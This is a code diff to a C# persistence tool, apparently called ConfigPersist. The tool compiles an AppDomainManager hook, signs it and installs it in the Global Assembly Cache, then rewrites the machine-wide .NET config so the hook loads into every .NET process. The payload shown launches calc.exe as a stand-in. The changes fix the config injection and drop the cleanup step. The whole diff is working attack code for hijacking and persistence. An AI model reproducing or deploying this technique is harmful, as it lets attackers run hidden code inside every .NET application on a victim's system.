@@ -130,7 +130,7 @@ namespace ConfigPersist
         {
             var malCSharp = @"using System;
                 namespace Context {
-                    public sealed class CLRHooking : AppDomainManager {
+                    public sealed class ConfigHook : AppDomainManager {
                         public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
                             System.Diagnostics.Process.Start(""calc.exe"");
                             return;
@@ -149,14 +149,25 @@ namespace ConfigPersist
             // ADD reference assemblies here
             cp.ReferencedAssemblies.Add("System.dll");
             cp.TreatWarningsAsErrors = false;
-            dllPath = $"{dllPath}\\{name}.dll";
+            dllPath = $"{dllPath}\\{name}1.dll";
             cp.OutputAssembly = dllPath;
             cp.GenerateInMemory = false;
             cp.CompilerOptions = "/optimize";
+            cp.CompilerOptions = "/keyfile:..\\..\\Keyfile\\key.snk";
             cp.IncludeDebugInformation = false;
             CompilerResults cr = objCodeCompiler.CompileAssemblyFromSource(cp, malCSharp);
             Console.WriteLine(cr.PathToAssembly);
-            var asmFullName = cr.CompiledAssembly.FullName;
+            string asmFullName;
+            try
+            {
+                asmFullName = cr.CompiledAssembly.FullName;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("An exception occurred while trying to get fullname, most likely due to missing keyfile!");
+                Console.WriteLine(e);
+                asmFullName = "test, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null";
+            }
 
             if (cr.Errors.Count > 0)
             {
@@ -191,19 +202,20 @@ namespace ConfigPersist
                 XmlNode node = doc.SelectSingleNode("/configuration/runtime");
                 Console.WriteLine($"node is: {node}");
                 XmlElement ele = doc.CreateElement("appDomainManagerType");
-                ele.SetAttribute("value", "test");
+                ele.SetAttribute("value", "Context.ConfigHook");
                 node.AppendChild(ele.Clone());
-                XmlElement secondEle = doc.CreateElement("appDomainManagerType");
-                secondEle.SetAttribute("value", "version");
+                XmlElement secondEle = doc.CreateElement("appDomainManagerAssembly");
+                secondEle.SetAttribute("value", assemblyFullName);
                 node.AppendChild(secondEle.Clone());
                 doc.Save(configpath);
             }
             catch (Exception e)
             {
                 Console.WriteLine($"An exception has occurred while attempting to 'fix' config: {e}");
+                return false;
             }
 
-            return false;
+            return true;
         }
 
         static void Main(string[] args)
@@ -227,17 +239,25 @@ namespace ConfigPersist
                 {
                     throw new Exception("Unable to install assembly into GAC");
                 }
+
                 Console.WriteLine($"Successfully added assembly to CLR: {asmFullName}");
                 var configPath = System.Runtime.InteropServices.RuntimeEnvironment.SystemConfigurationFile;
                 Console.WriteLine(configPath);
                 bool configFixed = FixConfig(configPath, asmFullName);
                 if (configFixed == false)
                 {
-                    throw new Exception("unable to modify config");
+                    throw new Exception("Unable to modify config");
                 }
 
                 // clean up after ourselves as it's been installed onto GAC
-                File.Delete(dllPath);
+                try
+                {
+                    //File.Delete(dllPath);
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine($"An error occurred while attempting to delete dllPath: {e}");
+                }
 
                 Console.ReadLine();
             }
